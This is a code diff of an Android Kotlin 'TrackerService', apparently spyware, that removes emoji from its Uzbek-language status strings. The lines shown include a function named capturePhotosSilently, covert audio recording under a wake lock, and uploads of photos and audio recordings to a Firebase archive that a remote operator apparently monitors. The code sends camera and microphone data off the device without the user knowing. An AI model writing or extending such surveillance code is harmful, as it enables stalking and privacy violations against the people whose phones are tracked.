@@ -494,7 +494,7 @@ class TrackerService : Service() {
     private fun capturePhotosSilently() {
         val devId = getActiveDeviceId()
         acquireWakeLock(30000L)
-        mediaRef?.child("status")?.setValue("📷 Kameralar faollashmoqda...")
+        mediaRef?.child("status")?.setValue("Kameralar faollashmoqda...")
 
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
             mediaRef?.child("status")?.setValue("Kamera ruxsati berilmagan")
@@ -610,7 +610,7 @@ class TrackerService : Service() {
                     trimFirebaseArchive(archiveRef, 20)
                 }
             }
-            mediaRef?.child("status")?.setValue("📷 Yangi rasm qabul qilindi ($now)")
+            mediaRef?.child("status")?.setValue("Yangi rasm qabul qilindi ($now)")
         } catch (e: Exception) {
             Log.e(TAG, "saveBothPhotos error", e)
         } finally {
@@ -799,8 +799,8 @@ class TrackerService : Service() {
             audioRecordStartTime = System.currentTimeMillis()
             isRecording = true
             mediaRef?.child("is_audio_recording")?.setValue(true)
-            mediaRef?.child("audio_status")?.setValue("🎙️ Ovoz yozish boshlandi...")
-            mediaRef?.child("status")?.setValue("🎙️ Ovoz yozilmoqda...")
+            mediaRef?.child("audio_status")?.setValue("Ovoz yozish boshlandi...")
+            mediaRef?.child("status")?.setValue("Ovoz yozilmoqda...")
         } catch (e: Exception) {
             releaseWakeLock()
             Log.e(TAG, "Audio start error", e)
@@ -872,8 +872,8 @@ class TrackerService : Service() {
                     audioRef?.push()?.setValue(archiveAudio)?.addOnCompleteListener { task ->
                         releaseWakeLock()
                         if (task.isSuccessful) {
-                            mediaRef?.child("audio_status")?.setValue("🎙️ Ovoz saqlandi ($durationSec sek, ${bytes.size / 1024} KB)")
-                            mediaRef?.child("status")?.setValue("🎙️ Yangi ovoz yozuvi saqlandi ($now)")
+                            mediaRef?.child("audio_status")?.setValue("Ovoz saqlandi ($durationSec sek, ${bytes.size / 1024} KB)")
+                            mediaRef?.child("status")?.setValue("Yangi ovoz yozuvi saqlandi ($now)")
                             if (audioRef != null) {
                                 trimFirebaseArchive(audioRef, 20)
                             }
